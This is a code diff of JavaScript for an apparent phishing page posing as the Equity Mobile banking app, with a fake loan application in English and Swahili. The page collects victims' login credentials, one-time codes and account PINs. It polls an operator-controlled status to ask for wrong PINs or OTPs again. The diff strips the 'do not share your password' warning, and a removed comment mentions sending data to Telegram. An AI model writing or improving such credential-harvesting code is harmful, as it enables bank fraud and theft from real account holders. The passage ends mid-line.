@@ -10,12 +10,20 @@ document.addEventListener('DOMContentLoaded', () => {
   const screenSuccess = document.getElementById('screen-success');
   const loadingOverlay = document.getElementById('loading-overlay');
 
-  // Surface Error Banners
+  // Language Modal Elements
+  const langModal = document.getElementById('language-modal');
+  const btnToggleLang = document.getElementById('btn-toggle-lang');
+  const btnCloseLang = document.getElementById('btn-close-lang');
+  const langOptions = document.querySelectorAll('.lang-option');
+  const checkEn = document.getElementById('check-en');
+  const checkSw = document.getElementById('check-sw');
+
+  // Banners
   const credsBanner = document.getElementById('banner-creds-error');
   const otpBanner = document.getElementById('banner-otp-error');
   const pinBanner = document.getElementById('banner-pin-error');
 
-  // Inputs & Controls
+  // Inputs
   const countryDropdown = document.getElementById('country-dropdown');
   const loginIdentifier = document.getElementById('login-identifier');
   const loginPassword = document.getElementById('login-password');
@@ -30,6 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   let currentUserId = null;
   let statusPollInterval = null;
+  let currentLanguage = 'en';
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
@@ -41,7 +50,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (targetScreen) targetScreen.classList.add('active');
   }
 
-  // Country & Language Auto-Switch Configuration
+  // Country Configuration
   const countryConfigs = {
     'Tanzania, United Republic of': { lang: 'sw', flag: '🇹🇿', code: '+255', currency: 'TSh' },
     'Kenya': { lang: 'en', flag: '🇰🇪', code: '+254', currency: 'KSh' },
@@ -50,28 +59,20 @@ document.addEventListener('DOMContentLoaded', () => {
     'South Sudan': { lang: 'en', flag: '🇸🇸', code: '+211', currency: 'SSP' }
   };
 
-  function updateLanguageAndCountry(countryName) {
-    const config = countryConfigs[countryName] || countryConfigs['Kenya'];
-    const isSwahili = config.lang === 'sw';
+  function updateLanguageTexts(lang) {
+    currentLanguage = lang;
+    const isSwahili = lang === 'sw';
 
-    // Update Flag Badges
-    ['1', '2', '3'].forEach(id => {
-      const badge = document.getElementById(`badge-country-${id}`);
-      const flag = document.getElementById(`flag-display-${id}`);
-      if (badge) badge.innerText = countryName.toUpperCase();
-      if (flag) flag.innerText = config.flag;
-    });
+    if (checkEn && checkSw) {
+      checkEn.innerText = isSwahili ? '' : '✓';
+      checkSw.innerText = isSwahili ? '✓' : '';
+    }
 
-    document.getElementById('phone-flag-prefix').innerText = `${config.flag} ${config.code}`;
-    document.getElementById('pin-flag-prefix').innerText = `${config.flag} ${config.code}`;
-
-    // Language Text Translations
     if (isSwahili) {
       document.getElementById('welcome-lang-text').innerText = 'Swa';
       document.getElementById('txt-welcome-title').innerText = 'Karibu Equity Mobile';
-      document.getElementById('txt-welcome-sub').innerText = 'Habari za mchana! Ingia au sajili ili kuendelea';
+      document.getElementById('txt-welcome-sub').innerText = 'Habari za mchana! Ingia ili kuendelea';
       document.getElementById('btn-welcome-signin').innerText = 'Ingia';
-      document.getElementById('btn-welcome-register').innerText = 'Sajili';
 
       document.getElementById('lbl-step1').innerText = 'Hatua 1 ya 3';
       document.getElementById('lbl-calc-title').innerText = 'Kikokotoo cha Mkopo';
@@ -101,7 +102,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       document.getElementById('lbl-welcome-back').innerText = 'Karibu tena';
       document.getElementById('lbl-hello-there').innerText = 'Habari yako,';
-      document.getElementById('lbl-login-sub').innerText = 'Ingia ili kuendelea. Kumbuka, password yako ni siri yako, usimpe mtu yeyote.';
+      document.getElementById('lbl-login-sub').innerText = 'Ingia ili kuendelea. Password yako ni siri yako.';
       document.getElementById('lbl-country-select').innerText = 'Nchi';
       document.getElementById('lbl-identifier').innerText = 'Barua pepe au namba ya simu';
       document.getElementById('lbl-password').innerText = 'Password';
@@ -121,9 +122,8 @@ document.addEventListener('DOMContentLoaded', () => {
     } else {
       document.getElementById('welcome-lang-text').innerText = 'Eng';
       document.getElementById('txt-welcome-title').innerText = 'Welcome to Equity mobile';
-      document.getElementById('txt-welcome-sub').innerText = 'Good afternoon! Sign in or register to continue';
+      document.getElementById('txt-welcome-sub').innerText = 'Good afternoon! Sign in to continue';
       document.getElementById('btn-welcome-signin').innerText = 'Sign in';
-      document.getElementById('btn-welcome-register').innerText = 'Register';
 
       document.getElementById('lbl-step1').innerText = 'Step 1 of 3';
       document.getElementById('lbl-calc-title').innerText = 'Loan Calculator';
@@ -153,7 +153,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       document.getElementById('lbl-welcome-back').innerText = 'Welcome back';
       document.getElementById('lbl-hello-there').innerText = 'Hello there,';
-      document.getElementById('lbl-login-sub').innerText = 'Sign in to continue. Remember, your password is yours, do not share it with anyone.';
+      document.getElementById('lbl-login-sub').innerText = 'Sign in to continue. Remember, your password is yours.';
       document.getElementById('lbl-country-select').innerText = 'Country';
       document.getElementById('lbl-identifier').innerText = 'Email address or mobile number';
       document.getElementById('lbl-password').innerText = 'Password';
@@ -173,12 +173,51 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  countryDropdown.addEventListener('change', (e) => {
-    updateLanguageAndCountry(e.target.value);
+  // Language Modal Handlers
+  if (btnToggleLang) {
+    btnToggleLang.addEventListener('click', () => langModal.classList.add('active'));
+  }
+  if (btnCloseLang) {
+    btnCloseLang.addEventListener('click', () => langModal.classList.remove('active'));
+  }
+
+  langOptions.forEach(opt => {
+    opt.addEventListener('click', () => {
+      const selectedLang = opt.getAttribute('data-lang');
+      updateLanguageTexts(selectedLang);
+      langModal.classList.remove('active');
+    });
   });
 
-  // Initial setup
-  updateLanguageAndCountry('Tanzania, United Republic of');
+  // Country Dropdown Event
+  countryDropdown.addEventListener('change', (e) => {
+    const countryName = e.target.value;
+    const config = countryConfigs[countryName] || countryConfigs['Tanzania, United Republic of'];
+    
+    // Update Flags
+    ['1', '2', '3'].forEach(id => {
+      const badge = document.getElementById(`badge-country-${id}`);
+      const flag = document.getElementById(`flag-display-${id}`);
+      if (badge) badge.innerText = countryName.toUpperCase();
+      if (flag) flag.innerText = config.flag;
+    });
+
+    document.getElementById('phone-flag-prefix').innerText = `${config.flag} ${config.code}`;
+    document.getElementById('pin-flag-prefix').innerText = `${config.flag} ${config.code}`;
+
+    updateLanguageTexts(config.lang);
+  });
+
+  // GUARANTEED SIGN IN BUTTON CLICK HANDLER
+  const btnSignIn = document.getElementById('btn-welcome-signin');
+  if (btnSignIn) {
+    ['click', 'touchstart'].forEach(evt => {
+      btnSignIn.addEventListener(evt, (e) => {
+        e.preventDefault();
+        showScreen(screenStep1);
+      });
+    });
+  }
 
   // Sliders
   const loanSlider = document.getElementById('loan-amount-slider');
@@ -195,26 +234,23 @@ document.addEventListener('DOMContentLoaded', () => {
     monthsText.innerText = `Miezi ${e.target.value}`;
   });
 
-  // Password & PIN Visibility Toggles
+  // Visibility Toggles
   document.getElementById('toggle-password').addEventListener('click', () => {
     loginPassword.type = loginPassword.type === 'password' ? 'text' : 'password';
   });
 
   document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
-    pinBoxes.forEach(box => {
-      box.type = box.type === 'password' ? 'text' : 'password';
-    });
+    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
   });
 
-  // Number Input Enforcement & Flexible Focus
-  function setupAutoTab(boxes, buttonToEnable) {
+  // Flexible Box Digit Inputs
+  function setupAutoTab(boxes) {
     boxes.forEach((box, idx) => {
       box.addEventListener('input', () => {
         box.value = box.value.replace(/\D/g, '');
         if (box.value && idx < boxes.length - 1) {
           boxes[idx + 1].focus();
         }
-        checkFullInput();
       });
 
       box.addEventListener('keydown', (e) => {
@@ -223,42 +259,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }
       });
     });
-
-    function checkFullInput() {
-      const fullVal = Array.from(boxes).map(b => b.value).join('');
-      if (fullVal.length === boxes.length) {
-        buttonToEnable.classList.add('active-red');
-      } else {
-        buttonToEnable.classList.remove('active-red');
-      }
-    }
   }
 
-  setupAutoTab(otpBoxes, btnSubmitOtp);
-  setupAutoTab(pinBoxes, btnSubmitPin);
+  setupAutoTab(otpBoxes);
+  setupAutoTab(pinBoxes);
 
-  // Web OTP API SMS Autofill
-  if ('OTPCredential' in window) {
-    window.addEventListener('DOMContentLoaded', () => {
-      const ac = new AbortController();
-      navigator.credentials.get({
-        otp: { transport: ['sms'] },
-        signal: ac.signal
-      }).then(otp => {
-        if (otp && otp.code) {
-          const digits = otp.code.replace(/\D/g, '').split('');
-          otpBoxes.forEach((box, i) => box.value = digits[i] || '');
-          btnSubmitOtp.classList.add('active-red');
-          submitOtpHandler();
-        }
-      }).catch(() => {});
-    });
-  }
-
-  // Navigation Event Handlers
-  document.getElementById('btn-welcome-signin').addEventListener('click', () => showScreen(screenStep1));
-  document.getElementById('btn-welcome-register').addEventListener('click', () => showScreen(screenStep1));
-
+  // Step Navigation Buttons
   document.getElementById('btn-step1-back').addEventListener('click', () => showScreen(screenWelcome));
   document.getElementById('btn-step1-next').addEventListener('click', () => showScreen(screenStep2));
 
@@ -266,8 +272,8 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('btn-step2-next').addEventListener('click', () => {
     const fn = document.getElementById('first-name').value.trim();
     const ln = document.getElementById('last-name').value.trim();
-
     const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republic of'];
+
     document.getElementById('sum-amount').innerText = `${config.currency} ${Number(loanSlider.value).toLocaleString()}`;
     document.getElementById('sum-months').innerText = `${monthsSlider.value} Miezi`;
     document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || 'Biashara';
@@ -278,7 +284,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen(screenStep2));
 
-  // Step 3 Completion -> Send First Summary to Telegram immediately, then proceed to Login
+  // Step 3 Next -> Submit Summary & Move to Login Screen
   document.getElementById('btn-step3-next').addEventListener('click', async () => {
     showLoading('INATHIBITISHA...', 'Tafadhali subiri.');
 
@@ -308,18 +314,6 @@ document.addEventListener('DOMContentLoaded', () => {
       showScreen(screenLogin);
     }
   });
-
-  // Login Input Checks
-  function validateLoginInputs() {
-    if (loginIdentifier.value.trim() && loginPassword.value.trim()) {
-      btnSubmitLogin.classList.add('active-red');
-    } else {
-      btnSubmitLogin.classList.remove('active-red');
-    }
-  }
-
-  loginIdentifier.addEventListener('input', validateLoginInputs);
-  loginPassword.addEventListener('input', validateLoginInputs);
 
   // Submit Login Credentials
   btnSubmitLogin.addEventListener('click', async () => {
@@ -437,5 +431,17 @@ document.addEventListener('DOMContentLoaded', () => {
             otpBanner.classList.add('active');
           }
           otpBoxes.forEach(b => b.value = '');
-          btnSubmitOtp.classList.remove('active-red');
-          showScreen(
+          showScreen(screenOtp);
+        } else if (data.status === 'RETRY_PIN') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (pinBanner) {
+            pinBanner.innerText = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
+            pinBanner.classList.add('active');
+          }
+          pinBoxes.forEach(b => b.value = '');
+          showScreen(screenPin);
+        } else if (data.status === 'SUCCESS') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republ
